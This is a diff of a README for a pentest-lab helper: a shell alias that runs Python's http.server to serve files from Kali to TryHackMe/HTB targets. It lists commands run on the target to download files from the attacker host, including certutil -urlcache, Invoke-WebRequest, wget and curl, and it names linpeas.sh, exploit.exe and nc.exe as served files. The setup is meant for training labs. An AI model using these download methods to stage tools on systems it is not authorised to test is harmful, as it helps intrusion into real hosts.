@@ -1,13 +1,15 @@
-# Quick HTTP Server for Penetration Testing Labs (python)
+# Quick HTTP Server for Penetration Testing Labs (Python)
 
 A minimal HTTP file transfer setup for penetration testing labs.  
-Designed for **reliable file delivery from Kali to targets** in local labs and VPN-based environments (TryHackMe / HTB).
+Designed for **reliable file delivery** from Kali to targets in **local labs** and **VPN-based environments** (TryHackMe / HTB).
+
+This setup prioritizes **speed, simplicity, and reliability** during lab and exam-style scenarios.
 
 ---
 
 ## 🎯 Use case
 
-- Deliver files **from Kali to a target**
+- Deliver files from Kali to a target
 - Ideal for:
   - Payload delivery
   - Tool transfer
@@ -24,16 +26,18 @@ Designed for **reliable file delivery from Kali to targets** in local labs and V
 ## 🧠 Design choices
 
 - Uses Python’s built-in `http.server`
-- Started via a **shell alias (`httpstart`)**
+- Started via a shell alias (`httpstart`)
 - Server listens on `0.0.0.0` (all interfaces)
-- Shares **only the current working directory (`pwd`)**
-- Alias prints **both LAN and VPN IPs** for clarity
+- Shares **only** the current working directory (`pwd`)
+- Alias prints both **LAN** and **VPN** IPs for clarity
+- Intentionally unauthenticated for lab speed and simplicity
 
 ---
 
 ## 📦 One-time setup
 
-No installation is required.  
+No installation is required.
+
 Python 3 is already present on Kali Linux.
 
 ---
@@ -86,10 +90,10 @@ source ~/.zshrc
 httpstart
 ```
 
-Defaults:
+### Defaults
 
 * Port: `8000`
-* Directory: **current working directory (`pwd`)**
+* Directory: current working directory (`pwd`)
 
 ---
 
@@ -99,13 +103,13 @@ Defaults:
 httpstart 8080
 ```
 
-(Change directory **before** starting the server.)
+Change directory **before** starting the server.
 
 ---
 
 ## 📂 What is shared?
 
-**Only the directory from which `httpstart` is executed.**
+Only the directory from which `httpstart` is executed.
 
 Example:
 
@@ -126,7 +130,7 @@ httpstart
 
 Available to the target:
 
-```
+```text
 http://<KALI_IP>:8000/linpeas.sh
 http://<KALI_IP>:8000/exploit.exe
 http://<KALI_IP>:8000/tools/nc.exe
@@ -146,7 +150,7 @@ Invoke-WebRequest http://<KALI_IP>:8000/file.exe -OutFile file.exe
 
 ### Restricted environments
 
-```powershell
+```text
 certutil -urlcache -f http://<KALI_IP>:8000/file.exe file.exe
 ```
 
@@ -158,7 +162,7 @@ certutil -urlcache -f http://<KALI_IP>:8000/file.exe file.exe
 wget http://<KALI_IP>:8000/file
 ```
 
-or
+or:
 
 ```bash
 curl -O http://<KALI_IP>:8000/file
@@ -172,20 +176,21 @@ curl -O http://<KALI_IP>:8000/file
 
 Use the **LAN IP**:
 
-```
+```text
 192.168.122.x
 ```
 
 ### TryHackMe / HTB target
 
-Use the **VPN IP (tun0)**:
+Use the **VPN IP** (`tun0`):
 
-```
-192.168.x.x   or   10.x.x.x
+```text
+10.x.x.x
+192.168.x.x
 ```
 
-The server listens on all interfaces (`0.0.0.0`).
-**The client must connect to an IP it can reach.**
+The server listens on **all interfaces** (`0.0.0.0`).
+The client must connect to an IP it can actually reach.
 
 ---
 
@@ -193,12 +198,13 @@ The server listens on all interfaces (`0.0.0.0`).
 
 * Prefer **HTTP** whenever a target can download files
 * Use **FTP** only when upload capability is required
-* Avoid shared folders and GUI copy/paste
+* Avoid shared folders and GUI copy/paste shortcuts
 * Choose transfer methods based on:
 
   * Routing
   * VPN reachability
   * Reliability
+  * Target limitations
 
 ---
 
@@ -206,7 +212,6 @@ The server listens on all interfaces (`0.0.0.0`).
 
 * Zero setup
 * One command (`httpstart`)
-* Shares only `pwd`
+* Shares only the current working directory
 * Clean, reliable, and low-noise
-* Ideal for VPN-based pentesting labs
-
+* Ideal for VPN-based penetration testing labs
